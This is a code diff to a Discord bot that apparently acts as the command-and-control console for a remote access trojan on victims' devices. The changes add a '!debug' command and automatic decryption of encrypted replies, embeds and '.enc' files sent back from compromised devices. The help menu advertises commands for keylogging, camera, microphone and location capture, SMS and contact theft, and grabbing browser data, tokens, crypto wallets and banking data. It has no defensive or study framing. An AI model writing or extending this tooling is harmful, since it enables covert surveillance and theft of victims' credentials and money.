@@ -21,7 +21,7 @@ import { getPhantomChannels, findPhantomChannel, resolveTarget, requireTarget } 
 import { collectChannelResponse } from './bot/collector.js'
 import { createStateStore, reviveMaps } from './bot/state.js'
 import { formatDeviceResponse } from './bot/formatter.js'
-import { decrypt, encrypt } from './lib/crypto.js'
+import { decrypt, encrypt, decryptBytes } from './lib/crypto.js'
 
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
@@ -249,7 +249,7 @@ function helpEmbed() {
   const box = createBox(
     `${A.brightCyan}${smallCaps('command reference')}${A.reset}\n` +
     `${A.cyan}┃${A.reset}\n` +
-    `${A.cyan}┃${A.reset} ${A.green}RECON${A.reset}      : !ping !sysinfo !antidetect !ip !uptime !status\n` +
+    `${A.cyan}┃${A.reset} ${A.green}RECON${A.reset}      : !ping !sysinfo !antidetect !ip !uptime !status !debug\n` +
     `${A.cyan}┃${A.reset} ${A.green}       ${A.reset}      : !sysprop !services !apps !storage !battery\n` +
     `${A.cyan}┃${A.reset}\n` +
     `${A.cyan}┃${A.reset} ${A.red}SURVEILL${A.reset}    : !screenshot !camera !mic !location !clipboard\n` +
@@ -286,7 +286,7 @@ function helpEmbed() {
       .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
       .setThumbnail(randGif())
       .addFields(
-        { name: `${E.zap} RECON`, value: '`!ping` `!sysinfo` `!antidetect` `!ip` `!uptime` `!battery`', inline: true },
+        { name: `${E.zap} RECON`, value: '`!ping` `!sysinfo` `!antidetect` `!ip` `!uptime` `!status` `!debug`', inline: true },
         { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
         { name: `${E.book} INTEL`, value: '`!contacts` `!sms` `!call_log` `!wifi` `!installed` `!processes`', inline: true },
         { name: `${E.diamond} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets|files|clipboard|banks|whatsapp|chrome|docs]`', inline: true },
@@ -942,29 +942,74 @@ client.on(Events.MessageCreate, async (msg) => {
       const b64 = c.slice(2).trim()
       try {
         const plain = decrypt(b64)
-        const decryptEmbed = new EmbedBuilder()
-          .setColor(C.info)
-          .setTitle(`${E.unlock} Decrypted Response`)
-          .setDescription(`\`\`\`\n${plain.slice(0, 1900)}\n\`\`\``)
-          .setFooter({ text: `auto-decrypted • ${msg.channel.name}` })
-          .setTimestamp()
-        await msg.reply({ embeds: [decryptEmbed] }).catch(() => {})
+        if (plain) {
+          const decryptEmbed = new EmbedBuilder()
+            .setColor(C.info)
+            .setTitle(`${E.unlock} Decrypted Response`)
+            .setDescription(`\`\`\`\n${plain.slice(0, 1900)}\n\`\`\``)
+            .setFooter({ text: `auto-decrypted • ${msg.channel.name}` })
+            .setTimestamp()
+          await msg.reply({ embeds: [decryptEmbed] }).catch(() => {})
+        }
       } catch {}
       return
+    }
+
+    // Auto-decrypt encrypted embeds (🔒 Secure Message title)
+    if (msg.embeds?.length) {
+      const embed = msg.embeds[0]
+      if (embed.title === '🔒 Secure Message' && embed.description) {
+        try {
+          const plain = decrypt(embed.description.trim())
+          if (plain) {
+            const decryptEmbed = new EmbedBuilder()
+              .setColor(C.info)
+              .setTitle(`${E.unlock} Decrypted Response`)
+              .setDescription(`\`\`\`\n${plain.slice(0, 1900)}\n\`\`\``)
+              .setFooter({ text: `auto-decrypted • ${msg.channel.name}` })
+              .setTimestamp()
+            await msg.reply({ embeds: [decryptEmbed] }).catch(() => {})
+          }
+        } catch {}
+        return
+      }
+    }
+
+    // Auto-decrypt encrypted file attachments (.enc)
+    if (msg.attachments?.size) {
+      let handled = false
+      for (const [, att] of msg.attachments) {
+        if (att.name.endsWith('.enc')) {
+          try {
+            const response = await fetch(att.url)
+            const encBytes = Buffer.from(await response.arrayBuffer())
+            const plainBytes = decryptBytes(encBytes)
+            const plainName = att.name.replace(/\.enc$/, '')
+            const plainAtt = new AttachmentBuilder(plainBytes, { name: plainName })
+            let caption = `${E.unlock} Decrypted File: ${plainName}`
+            if (c.startsWith('🔒 ')) {
+              try { caption = `${E.unlock} Decrypted: ${decrypt(c.slice(2).trim())}` } catch {}
+            }
+            await msg.reply({ content: caption, files: [plainAtt] }).catch(() => {})
+            handled = true
+          } catch (e) {
+            console.error('File decrypt error:', e.message)
+          }
+        }
+      }
+      if (handled) return
     }
 
     // Skip encrypt banner + base64 lines from decryption embed editing
     if (c.startsWith('🔒') || msg.author.id === client.user.id) return
 
-    if (c.length > 2 && !msg.embeds.length) {
-      try {
-        const deviceName = msg.channel.name.replace('device-', '')
-        const formatted = formatDeviceResponse(c, deviceName)
-        if (formatted) {
-          await msg.edit({ content: '', embeds: formatted.embeds }).catch(() => {})
-        }
-      } catch {}
-    }
+    try {
+      const deviceName = msg.channel.name.replace('device-', '')
+      const formatted = formatDeviceResponse(c, deviceName)
+      if (formatted) {
+        await msg.edit({ content: '', embeds: formatted.embeds }).catch(() => {})
+      }
+    } catch {}
   }
 })
 
